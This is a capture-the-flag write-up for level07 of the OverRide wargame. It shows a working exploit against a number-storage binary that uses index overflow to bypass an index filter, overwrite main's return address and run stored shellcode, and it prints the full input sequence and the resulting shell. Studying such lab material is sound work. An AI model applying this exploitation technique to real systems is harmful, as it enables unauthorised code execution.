This level wait for multiple commands like read, store, quit.

	----------------------------------------------------
	  Welcome to wil's crappy number storage service!   
	----------------------------------------------------
	 Commands:                                          
	    store - store a number into the data storage    
	    read  - read a number from the data storage     
	    quit  - exit the program                        
	----------------------------------------------------
	   wil has reserved some storage :>                 
	----------------------------------------------------

	Input command: 

After checking the code inside gdb, ghidra we've seen that a shellcode would do the job.

But there is 2 problems.
+ The main function flush the arguments and the env.
So we cannot store the shellcode in the env and pass the address as always. We must store it using the binary.

+ In store_number function the number will be stored only if the index is not % 3 and the most significant bit must not be equal to 0xb7.
After some check we can put any index in while we store so we'll just overflow the index to get the in the index % 3 values.

The data storage is inside the stack as tab[100], we will rewrite the main return address from the data storage.

After few research (alot) we found that return address of main is at index 114 inside the data storage.\
The plan is now to write the address of tab[100] inside the index 114, then we write our shellcode from the index 0.

Since the shellcode is not stored inside the env but in the data store we must reverse it and convert it to base 10.\
It will look like this.

	store
	4294956388
	1073741938
	store
	2425393296
	1073741824
	store
	2425393296
	1
	store
	2425393296
	2
	store
	2425393296
	1073741827
	store
	2425393296
	4
	store
	2425393296
	5
	store
	1750122545
	1073741830
	store
	1752379183
	7
	store
	1768042344
	8
	store
	2313390446
	1073741833
	store
	2965539265
	10
	store
	830524683
	11
	store
	2160935104
	1073741836
	read
	-9
	quit

This is our shell code with 
	store
	4294956388
	1073741938

As rewriting the return address of main.

Let's try it !

	level07@OverRide:~$ cat test3 - | ./level07 
	----------------------------------------------------
	  Welcome to wil's crappy number storage service!   
	----------------------------------------------------
	 Commands:                                          
	    store - store a number into the data storage    
	    read  - read a number from the data storage     
	    quit  - exit the program                        
	----------------------------------------------------
	   wil has reserved some storage :>                 
	----------------------------------------------------

	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Index:  Number at data[4294967287] is 4294956388
	 Completed read command successfully
	whoami
	level08

Let's head to the next level !